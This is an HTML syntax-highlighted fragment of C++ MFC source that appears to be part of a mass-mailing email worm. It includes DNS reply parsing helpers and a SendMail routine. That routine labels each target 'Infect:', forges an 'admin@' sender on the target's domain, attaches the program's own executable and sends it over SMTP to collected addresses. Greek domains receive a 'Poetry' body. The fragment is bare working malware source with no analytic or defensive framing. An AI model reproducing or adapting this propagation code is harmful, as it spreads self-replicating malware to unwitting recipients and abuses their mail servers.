</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">CSendMessage</span><span class="sc10">::</span><span class="sc11">SkipData</span><span class="sc10">(</span><span class="sc11">u_char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pStartOfMesssage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">u_char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pCurrentPosition</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">u_short</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">u_short</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pClass</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">u_int32_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pTimeToLive</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">u_short</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pDataLength</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">u_char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pEndOfMessage</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">u_char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pTempPosition</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pCurrentPosition</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// Skip the data name
</span><span class="sc0">    </span><span class="sc11">pTempPosition</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">SkipName</span><span class="sc10">(</span><span class="sc11">pStartOfMesssage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pTempPosition</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pEndOfMessage</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">// Get the Type, Class, TTL and Data Length
</span><span class="sc0">    </span><span class="sc11">GETSHORT</span><span class="sc10">(*</span><span class="sc11">pType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pTempPosition</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">GETSHORT</span><span class="sc10">(*</span><span class="sc11">pClass</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pTempPosition</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">GETLONG</span><span class="sc10">(*</span><span class="sc11">pTimeToLive</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pTempPosition</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">GETSHORT</span><span class="sc10">(*</span><span class="sc11">pDataLength</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pTempPosition</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">pTempPosition</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">pCurrentPosition</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">CSendMessage</span><span class="sc10">::</span><span class="sc11">SkipName</span><span class="sc10">(</span><span class="sc11">u_char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pStartOfMesssage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">u_char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pCurrentPosition</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">u_char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pEndOfMessage</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">MAXDNAME</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dn_expand</span><span class="sc10">(</span><span class="sc11">pStartOfMesssage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pEndOfMessage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pCurrentPosition</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAXDNAME</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">n</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">CSendMessage</span><span class="sc10">::</span><span class="sc11">AppendResult</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nRequestedType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPCTSTR</span><span class="sc0"> </span><span class="sc11">lpszResult</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">szTotalResult</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">nRequestedType</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">nRequestedType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">T_ANY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">szTotalResult</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">szTotalResult</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lpszResult</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// Append name (using separator property to separate entries)
</span><span class="sc0">            </span><span class="sc11">szTotalResult</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc6">","</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">szTotalResult</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">lpszResult</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">CSendMessage</span><span class="sc10">::</span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">CEmailAdr</span><span class="sc0"> </span><span class="sc11">Mail</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc9">#ifdef _DEBUG
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">AfxMessageBox</span><span class="sc10">(</span><span class="sc11">CString</span><span class="sc10">(</span><span class="sc6">"Infect:"</span><span class="sc10">)+</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_UserName</span><span class="sc10">+</span><span class="sc11">CString</span><span class="sc10">(</span><span class="sc6">"@"</span><span class="sc10">)+</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_Domain</span><span class="sc10">,</span><span class="sc11">MB_OKCANCEL</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc11">MB_DEFBUTTON2</span><span class="sc0">     </span><span class="sc10">|</span><span class="sc11">MB_ICONSTOP</span><span class="sc0">   </span><span class="sc10">)!=</span><span class="sc11">IDOK</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc9">#endif
</span><span class="sc0">
    </span><span class="sc11">TRY</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">FromEmail</span><span class="sc10">==</span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">FromEmail</span><span class="sc10">=</span><span class="sc6">"admin@"</span><span class="sc10">+</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_Domain</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_Subject</span><span class="sc10">=</span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">       

    
    </span><span class="sc11">CMIMEMessage</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">m_sFrom</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FromEmail</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">FromEmail</span><span class="sc10">=</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_UserName</span><span class="sc10">+</span><span class="sc6">"@"</span><span class="sc10">+</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_Domain</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">m_sSubject</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_Subject</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">AddMultipleRecipients</span><span class="sc10">(</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_UserName</span><span class="sc10">+</span><span class="sc6">"@"</span><span class="sc10">+</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_Domain</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_Domain</span><span class="sc10">.</span><span class="sc11">Right</span><span class="sc10">(</span><span class="sc4">3</span><span class="sc10">)==</span><span class="sc6">".gr"</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">m_sBody</span><span class="sc10">=</span><span class="sc11">theApp</span><span class="sc10">.</span><span class="sc11">Poetry</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0"> 
        </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">m_sBody</span><span class="sc10">=</span><span class="sc6">" "</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc11">Filename</span><span class="sc10">=</span><span class="sc11">__targv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">AddMIMEPart</span><span class="sc10">(</span><span class="sc11">Filename</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">CSMTP</span><span class="sc0"> </span><span class="sc11">smtp</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_MailServer</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">smtp</span><span class="sc10">.</span><span class="sc11">Connect</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">smtp</span><span class="sc10">.</span><span class="sc11">SendMailMessage</span><span class="sc10">(&amp;</span><span class="sc11">msg</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">smtp</span><span class="sc10">.</span><span class="sc11">Disconnect</span><span class="sc10">();</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">CATCH</span><span class="sc10">(</span><span class="sc11">CMemoryException</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">//duh!
</span><span class="sc0">        </span><span class="sc5">delete</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">AND_CATCH</span><span class="sc10">(</span><span class="sc11">CException</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">delete</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">END_CATCH</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">CSendMessage</span><span class="sc10">::</span><span class="sc11">PreTranslateMessage</span><span class="sc10">(</span><span class="sc11">MSG</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">pMsg</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">// TODO: Add your specpialized code here and/or call the base class
</span><span class="sc0">    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CWinThread</span><span class="sc10">::</span><span class="sc11">PreTranslateMessage</span><span class="sc10">(</span><span class="sc11">pMsg</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">CSendMessage</span><span class="sc10">::</span><span class="sc11">OnIdle</span><span class="sc10">(</span><span class="sc11">LONG</span><span class="sc0"> </span><span class="sc11">lCount</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">OnEmailAdded</span><span class="sc10">();</span><span class="sc0">
    
    </span><span class="sc11">CWinThread</span><span class="sc10">::</span><span class="sc11">OnIdle</span><span class="sc10">(</span><span class="sc11">lCount</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
